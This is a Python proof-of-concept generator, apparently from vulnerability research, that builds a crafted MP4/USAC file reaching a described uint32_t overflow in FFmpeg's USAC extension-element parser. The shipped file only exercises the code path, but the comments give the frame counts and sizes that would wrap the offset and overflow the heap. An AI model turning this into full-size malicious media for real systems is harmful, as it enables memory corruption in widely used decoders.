#!/usr/bin/env python3
"""
PoC generator for VULN 001:
parse_ext_ele() in aacdec_usac.c - Integer Overflow -> Heap Buffer Overflow (CWE-190 -> CWE-122)

The vulnerability: when usacExtElementPayloadFrag=1, per-frame payload fragments are
accumulated in e->ext.pl_data_offset (uint32_t). After enough continuation frames,
the addition pl_data_offset + len overflows uint32_t, causing underallocation via
av_refstruct_alloc_ext(), followed by a memcpy heap overflow.

This PoC creates a minimal MP4/USAC file that exercises the fragmented extension element
code path (enters parse_ext_ele with payload_frag=1 and continuation frames).
Triggering the actual overflow requires ~4 GB of data; this file demonstrates the
code path with a small file.

Design:
  UsacDecoderConfig has 2 elements:
    1. SCE (single channel element, mono) with tw_mdct=0, noise_fill=0
       - Gives the decoder a valid mono channel layout so ffmpeg's filter graph works
       - Each frame has a minimal FD-mode SCE: core_mode=0, max_sfb=0 (silence)
    2. EXT (extension element) with type=FILL, payloadFrag=1
       - Frames cycle through: start fragment -> continuation -> end fragment
       - On each continuation frame, pl_data_offset grows by len bytes

Binary format references:
  - ISO 14496-3 (MPEG-4 Audio) for AudioSpecificConfig and USAC bitstream
  - ISO 14496-12 (MPEG-4 Base Media File Format) for MP4 container
  - ISO 23003-3 (USAC) for UsacConfig and UsacFrame
"""

import struct
import os

OUTPUT_FILE = os.path.join(os.path.dirname(__file__), 'vuln_001_input.mp4')

# ─── Bit-packing helper ──────────────────────────────────────────────────────

class BitWriter:
    """Packs bits MSB-first into bytes, matching FFmpeg's GetBitContext."""
    def __init__(self):
        self._bits = []

    def write(self, value, n_bits):
        """Write the lowest n_bits of value, MSB first."""
        for i in range(n_bits - 1, -1, -1):
            self._bits.append((value >> i) & 1)

    def write_bytes(self, data):
        """Write each byte of data as 8 MSB-first bits."""
        for b in data:
            self.write(b, 8)

    def to_bytes(self):
        """Pad to byte boundary with zeros and return as bytes."""
        bits = list(self._bits)
        while len(bits) % 8 != 0:
            bits.append(0)
        result = bytearray()
        for i in range(0, len(bits), 8):
            byte = 0
            for j in range(8):
                byte = (byte << 1) | bits[i + j]
            result.append(byte)
        return bytes(result)


def write_escaped_value(bw, value, n1, n2=0, n3=0):
    """
    Write value using get_escaped_value(gb, n1, n2, n3) encoding.
    For values < 2^n1 - 1, just write n1 bits.
    """
    max1 = (1 << n1) - 1
    if value < max1:
        bw.write(value, n1)
    else:
        bw.write(max1, n1)
        max2 = (1 << n2) - 1
        if n2 and value - max1 < max2:
            bw.write(value - max1, n2)
        else:
            if n2:
                bw.write(max2, n2)
            if n3:
                bw.write(value - max1 - max2, n3)


# ─── AudioSpecificConfig for USAC (AOT=42) ──────────────────────────────────
#
# Outer header (ISO 14496-3 §1.6.6.1 AudioSpecificConfig):
#   audioObjectType = 42 (USAC): escape(31) + ext(10)
#   samplingFrequencyIndex = 3 → 48000 Hz (standard MPEG-4 table)
#   channelConfig = 1 → mono
#
# UsacConfig (ISO 23003-3):
#   usacSamplingFrequencyIndex = 3 → 48000 Hz (USAC table)
#   coreSbrFrameLengthIndex = 1 → 1024 samples/frame, no SBR
#   channelConfigurationIndex = 1 → standard mono layout
#     (invokes ff_aac_set_default_channel_config for mono)
#   UsacDecoderConfig:
#     numElements = 1 (via get_escaped_value = 1 → nb_elems=2)
#     Element 0: usacElementType=0 (SCE)
#       tw_mdct = 0, noise_fill = 0   [required by decode_usac_element_core]
#     Element 1: usacElementType=3 (EXT)
#       usacExtElementType = 0 (ID_EXT_ELE_FILL)   → easy, no config bits
#       usacExtElementConfigLength = 0
#       usacExtElementDefaultLengthPresent = 0
#       usacExtElementPayloadFrag = 1  ← KEY vulnerability trigger
#   usacConfigExtensionPresent = 0

def build_audio_specific_config():
    bw = BitWriter()

    # audioObjectType = 42 (USAC)
    bw.write(31, 5)   # AOT escape (= 31 = 11111)
    bw.write(10, 6)   # ext AOT = 42 - 32 = 10 (= 001010)

    # samplingFrequencyIndex = 3 → 48000 Hz (ff_mpeg4audio_sample_rates[3])
    bw.write(3, 4)

    # channelConfig = 1 (mono → ff_aac_set_default_channel_config)
    bw.write(1, 4)

    # ── UsacConfig ────────────────────────────────────────────────────────

    # usacSamplingFrequencyIndex = 3 → 48000 Hz (ff_aac_usac_samplerate[3])
    bw.write(3, 5)

    # coreSbrFrameLengthIndex = 1 → core_frame_len=1024, sbr_ratio=0
    bw.write(1, 3)

    # channelConfigurationIndex = 1 (standard mono)
    bw.write(1, 5)

    # ── UsacDecoderConfig ─────────────────────────────────────────────────

    # numElements: get_escaped_value(gb,4,8,16) = 1 → nb_elems = 1+1 = 2
    write_escaped_value(bw, 1, 4, 8, 16)

    # Element 0: usacElementType = 0 (SCE)
    bw.write(0, 2)

    # decode_usac_element_core():
    bw.write(0, 1)   # tw_mdct = 0
    bw.write(0, 1)   # noise_fill = 0
    # sbr_ratio=0 → no sbr data

    # Element 1: usacElementType = 3 (EXT)
    bw.write(3, 2)

    # decode_usac_extension():
    # usacExtElementType: get_escaped_value(gb,4,8,16) = 0 (ID_EXT_ELE_FILL)
    write_escaped_value(bw, 0, 4, 8, 16)

    # usacExtElementConfigLength: get_escaped_value(gb,4,8,16) = 0
    write_escaped_value(bw, 0, 4, 8, 16)

    # usacExtElementDefaultLengthPresent = 0
    bw.write(0, 1)

    # usacExtElementPayloadFrag = 1  ← THIS IS THE VULNERABILITY TRIGGER
    bw.write(1, 1)

    # switch(ID_EXT_ELE_FILL): break — no additional config bits consumed

    # usacConfigExtensionPresent = 0
    bw.write(0, 1)

    return bw.to_bytes()


# ─── USAC frame builder ──────────────────────────────────────────────────────
#
# Each frame contains:
#   indep_flag (1 bit)
#   ─── SCE element (decode_usac_core_coder, nb_channels=1) ───
#     core_mode (1 bit) = 0    [FD mode, not LPD]
#     tns_data_present (1 bit) = 0   [since core_nb_channels==1]
#     global_gain (8 bits)
#     ics_info (not EIGHT_SHORT):
#       window_sequence (2 bits) = 0   [ONLY_LONG_SEQUENCE]
#       use_kb_window (1 bit) = 0
#       max_sfb (6 bits) = 0           [no scale factor bands → silence]
#     decode_usac_scale_factors: no bits (max_sfb=0)
#     arith_reset_flag: read if indep_flag=0 (1 bit)
#     decode_spectrum_ac with len=swb_offset[0]=0: no bits read
#     fac_data_present (1 bit) = 0
#   ─── EXT element (parse_ext_ele) ───
#     usacExtElementPresent (1 bit) = 1
#     usacExtElementUseDefaultLength (1 bit) = 0   [default_len=0]
#     usacExtElementPayloadLength (8 bits)  [len < 255]
#     usacExtElementStart (1 bit)
#     usacExtElementStop  (1 bit)
#     payload (len bytes)

def build_usac_frame(indep_flag, frag_start, frag_stop, payload):
    """
    Build a raw USAC frame bitstream containing one SCE (silence) and one EXT element.

    indep_flag : 1 for independent/random-access frames, 0 otherwise
    frag_start : usacExtElementStart (1 = first fragment, 0 = continuation)
    frag_stop  : usacExtElementStop  (1 = last fragment,  0 = not last)
    payload    : bytes to include as extension element payload (len < 255)
    """
    assert len(payload) < 255, "Payload length must be < 255 for simple encoding"
    bw = BitWriter()

    # ── Frame header ──────────────────────────────────────────────────────
    bw.write(indep_flag, 1)

    # ── SCE element: minimal FD-mode, no audio (silence) ─────────────────

    # core_mode = 0 (FD, not LPD)
    bw.write(0, 1)

    # tns_data_present = 0  (read because core_nb_channels == 1)
    bw.write(0, 1)

    # global_gain: arbitrary non-zero value (0x7F = 127)
    bw.write(0x7F, 8)

    # ics_info() — ONLY_LONG_SEQUENCE, no short windows
    bw.write(0, 2)   # window_sequence = 0 (ONLY_LONG_SEQUENCE)
    bw.write(0, 1)   # use_kb_window = 0

    # max_sfb = 0: no scale factor bands → swb_offset[0]=0 → len=0
    # decode_spectrum_ac returns immediately when len=0 (no bits read)
    bw.write(0, 6)

    # setup_sce() is called here but reads no bits

    # tw_mdct = 0 in elem config → no tw_data bits

    # decode_usac_scale_factors: loops over max_sfb=0 groups → no bits

    # arith_reset_flag: only read when indep_flag = 0
    if not indep_flag:
        bw.write(0, 1)   # arith_reset_flag = 0

    # decode_spectrum_ac(len=swb_offset[max_sfb=0]=0, N=1024):
    # → len=0 → returns immediately, no bits consumed

    # fac_data_present = 0
    bw.write(0, 1)

    # sbr.ratio = 0 → no SBR bits
    # stereo_config_index = 0 → no MPS bits

    # ── EXT element: fragmented FILL payload ─────────────────────────────

    # usacExtElementPresent = 1
    bw.write(1, 1)

    # usacExtElementUseDefaultLength = 0 (default_len is 0, explicit len needed)
    bw.write(0, 1)

    # usacExtElementPayloadLength = len(payload)
    bw.write(len(payload), 8)

    # Fragmentation flags (read because payload_frag = 1 in config)
    bw.write(frag_start, 1)
    bw.write(frag_stop, 1)

    # Payload bytes (read 8 bits at a time in parse_ext_ele)
    bw.write_bytes(payload)

    return bw.to_bytes()


# ─── MP4 box builders ────────────────────────────────────────────────────────

def box(box_type, data):
    if isinstance(box_type, str):
        box_type = box_type.encode('latin-1')
    total = 8 + len(data)
    return struct.pack('>I', total) + box_type + data

def full_box(box_type, version, flags, data):
    header = struct.pack('>I', (version << 24) | flags)
    return box(box_type, header + data)


def build_mp4(asc, frames):
    """Build a minimal MP4/M4A file containing raw USAC audio frames."""

    # ── ftyp ────────────────────────────────────────────────────────────────
    ftyp = box('ftyp',
               b'M4A ' + struct.pack('>I', 0) +
               b'isom' + b'M4A ' + b'mp42')
    # 4(size)+4(type)+4(major)+4(minor)+12(compat) = 28 bytes

    # ── Build ES Descriptor (ESDS) carrying the AudioSpecificConfig ──────────

    # DecoderSpecificInfo (tag=0x05)
    dsi = bytes([0x05, len(asc)]) + asc

    # SLConfigDescriptor (tag=0x06): predefined=2 (MP4 stream)
    slcd = bytes([0x06, 0x01, 0x02])

    # DecoderConfigDescriptor (tag=0x04)
    # objectTypeIndication=0x40 (Audio ISO/IEC 14496-3)
    # streamType: audio=5, upStream=0, reserved=1 → (5<<2)|1 = 0x15
    dc_data = bytes([0x40, 0x15,
                     0x00, 0x00, 0x00,          # bufferSizeDB = 0
                     0x00, 0x00, 0x00, 0x00,    # maxBitrate = 0
                     0x00, 0x00, 0x00, 0x00,    # avgBitrate = 0
                     ]) + dsi
    dcd = bytes([0x04, len(dc_data)]) + dc_data

    # ES_Descriptor (tag=0x03): ES_ID=1, flags=0
    es_data = bytes([0x00, 0x01, 0x00]) + dcd + slcd
    es_desc = bytes([0x03, len(es_data)]) + es_data

    esds = full_box('esds', 0, 0, es_desc)

    # ── mp4a SampleEntry ─────────────────────────────────────────────────────
    mp4a_data = (
        b'\x00' * 6 +                        # reserved (6 bytes)
        struct.pack('>H', 1) +               # data_reference_index = 1
        b'\x00' * 8 +                        # reserved (8 bytes)
        struct.pack('>H', 1) +               # channel_count = 1 (mono)
        struct.pack('>H', 16) +              # sample_size = 16 bits
        struct.pack('>H', 0) +               # compression_id = 0
        struct.pack('>H', 0) +               # packet_size = 0
        struct.pack('>I', 48000 << 16)       # samplerate (16.16) = 48000.0
    )
    mp4a = box('mp4a', mp4a_data + esds)

    # ── stsd (sample description) ─────────────────────────────────────────────
    stsd = full_box('stsd', 0, 0, struct.pack('>I', 1) + mp4a)

    # ── stts (time-to-sample): all frames have delta = 1024 samples ──────────
    n_frames = len(frames)
    stts = full_box('stts', 0, 0,
                    struct.pack('>I', 1) +                  # entry_count
                    struct.pack('>II', n_frames, 1024))     # count, delta

    # ── stsc (sample-to-chunk): 1 chunk containing all frames ────────────────
    stsc = full_box('stsc', 0, 0,
                    struct.pack('>I', 1) +
                    struct.pack('>III', 1, n_frames, 1))    # first_chunk, spc, desc

    # ── stsz (variable sample sizes) ─────────────────────────────────────────
    frame_sizes = [len(f) for f in frames]
    stsz = full_box('stsz', 0, 0,
                    struct.pack('>I', 0) +                  # sample_size = 0 (variable)
                    struct.pack('>I', n_frames) +           # sample_count
                    b''.join(struct.pack('>I', s) for s in frame_sizes))

    # ── stco (chunk offset): placeholder — patched below ─────────────────────
    stco = full_box('stco', 0, 0,
                    struct.pack('>I', 1) +
                    struct.pack('>I', 0))  # offset TBD

    stbl = box('stbl', stsd + stts + stsc + stsz + stco)

    # ── smhd (Sound Media Header) ─────────────────────────────────────────────
    smhd = full_box('smhd', 0, 0, struct.pack('>HH', 0, 0))

    # ── dinf / dref ───────────────────────────────────────────────────────────
    url_entry = full_box('url ', 0, 1, b'')  # flags=1 = self-contained
    dref = full_box('dref', 0, 0, struct.pack('>I', 1) + url_entry)
    dinf = box('dinf', dref)

    # ── minf ─────────────────────────────────────────────────────────────────
    minf = box('minf', smhd + dinf + stbl)

    # ── mdhd (Media Header) ──────────────────────────────────────────────────
    timescale = 48000
    duration  = n_frames * 1024
    mdhd = full_box('mdhd', 0, 0,
                    struct.pack('>IIII', 0, 0, timescale, duration) +
                    struct.pack('>HH', 0x55C4, 0))   # language='und', pre_defined=0

    # ── hdlr ─────────────────────────────────────────────────────────────────
    hdlr = full_box('hdlr', 0, 0,
                    struct.pack('>I', 0) +    # pre_defined
                    b'soun' +                 # handler_type
                    b'\x00' * 12 +           # reserved[3]
                    b'\x00')                 # name (empty, null-terminated)

    # ── mdia ─────────────────────────────────────────────────────────────────
    mdia = box('mdia', mdhd + hdlr + minf)

    # ── tkhd (Track Header) ─────────────────────────────────────────── flags=3
    unity_matrix = struct.pack('>IIIIIIIII',
                               0x00010000, 0, 0,
                               0, 0x00010000, 0,
                               0, 0, 0x40000000)
    tkhd = full_box('tkhd', 0, 3,
                    struct.pack('>IIIII', 0, 0, 1, 0, duration) +
                    b'\x00' * 8 +                   # reserved
                    struct.pack('>HHH', 0, 0, 0x0100) +  # layer, alt_group, volume
                    struct.pack('>H', 0) +           # reserved
                    unity_matrix +
                    struct.pack('>II', 0, 0))        # width, height (audio → 0)

    trak = box('trak', tkhd + mdia)

    # ── mvhd (Movie Header) ──────────────────────────────────────────────────
    mvhd = full_box('mvhd', 0, 0,
                    struct.pack('>IIIII', 0, 0, timescale, duration, 0x00010000) +
                    struct.pack('>H', 0x0100) +
                    b'\x00' * 10 +
                    unity_matrix +
                    b'\x00' * 24 +
                    struct.pack('>I', 2))    # next_track_id = 2

    # ── First-pass moov to determine chunk offset ─────────────────────────────
    moov = box('moov', mvhd + trak)

    # chunk offset = ftyp + moov + mdat_header(8)
    chunk_offset = len(ftyp) + len(moov) + 8

    # ── Rebuild stco with actual offset ──────────────────────────────────────
    stco = full_box('stco', 0, 0,
                    struct.pack('>I', 1) +
                    struct.pack('>I', chunk_offset))

    stbl = box('stbl', stsd + stts + stsc + stsz + stco)
    minf = box('minf', smhd + dinf + stbl)
    mdia = box('mdia', mdhd + hdlr + minf)
    trak = box('trak', tkhd + mdia)
    moov = box('moov', mvhd + trak)

    # Verify offset didn't change (it won't if stco is same length)
    assert len(ftyp) + len(moov) + 8 == chunk_offset, "chunk offset mismatch"

    # ── mdat ─────────────────────────────────────────────────────────────────
    mdat = box('mdat', b''.join(frames))

    return ftyp + moov + mdat


def main():
    print("[*] Building USAC AudioSpecificConfig (SCE + EXT with payloadFrag=1)...")
    asc = build_audio_specific_config()
    print(f"    ASC ({len(asc)} bytes): {asc.hex()}")

    # USAC frames that exercise the fragmented extension element path.
    #
    # Vulnerability trigger sequence:
    #   Frame 0: frag_start=1, frag_stop=0 → pl_data_offset reset to 0, then += PAYLOAD_LEN
    #   Frames 1..N-2: frag_start=0, frag_stop=0 → pl_data_offset accumulates
    #   Frame N-1: frag_start=0, frag_stop=1 → accumulated payload processed (FILL → no-op)
    #
    # Overflow condition (NOT triggered here, needs ~4 GB):
    #   After ~65,278 frames with ~65,788 bytes/frame, pl_data_offset wraps uint32_t:
    #   av_refstruct_alloc_ext(small_wrapped_value, ...) underallocates,
    #   memcpy(tmp_buf, old_buf, ~4GB real offset) → heap buffer overflow

    PAYLOAD_LEN = 50   # bytes per fragment; keeps the file tiny
    PAYLOAD_DATA = bytes([0xAA] * PAYLOAD_LEN)  # recognizable fill pattern
    N_FRAMES = 10      # 1 start + 8 continuation + 1 end

    print(f"[*] Building {N_FRAMES} USAC frames (payload={PAYLOAD_LEN} bytes each)...")

    frames = []

    # Frame 0: start of fragment (independent frame)
    f = build_usac_frame(indep_flag=1, frag_start=1, frag_stop=0, payload=PAYLOAD_DATA)
    frames.append(f)
    print(f"    Frame 0 (START):        {len(f)} bytes  [frag_start=1, frag_stop=0]")

    # Frames 1..N-2: continuation fragments
    for i in range(1, N_FRAMES - 1):
        f = build_usac_frame(indep_flag=0, frag_start=0, frag_stop=0, payload=PAYLOAD_DATA)
        frames.append(f)
    print(f"    Frames 1-{N_FRAMES-2} (CONT):    {len(frames[1])} bytes  [frag_start=0, frag_stop=0]")

    # Frame N-1: end of fragment
    f = build_usac_frame(indep_flag=0, frag_start=0, frag_stop=1, payload=PAYLOAD_DATA)
    frames.append(f)
    print(f"    Frame {N_FRAMES-1} (STOP):        {len(f)} bytes  [frag_start=0, frag_stop=1]")

    print(f"[*] Building MP4 container...")
    mp4_data = build_mp4(asc, frames)

    print(f"[*] Writing {OUTPUT_FILE} ({len(mp4_data)} bytes)...")
    with open(OUTPUT_FILE, 'wb') as out:
        out.write(mp4_data)

    print("[+] Done.")
    print()
    print("Expected code path (aacdec_usac.c):")
    print("  ff_aac_usac_config_decode(): SCE element + EXT element with payloadFrag=1 configured")
    print("  ff_aac_usac_decode_frame():  for each frame:")
    print("    decode_usac_core_coder()   SCE element → silence (max_sfb=0)")
    print("    parse_ext_ele()            EXT element → accumulate payload in pl_buf")
    print(f"  Total pl_data_offset after {N_FRAMES} frames: {N_FRAMES * PAYLOAD_LEN} bytes")
    print()
    print("Overflow condition (NOT triggered - needs ~4 GB input):")
    print("  ~65,278 continuation frames × ~65,788 bytes/frame → uint32_t pl_data_offset wraps")
    print("  av_refstruct_alloc_ext(wrapped_small_value, ...)  → underallocates buffer")
    print("  memcpy(tmp_buf, old_buf, real_huge_offset)        → HEAP BUFFER OVERFLOW")

if __name__ == '__main__':
    main()

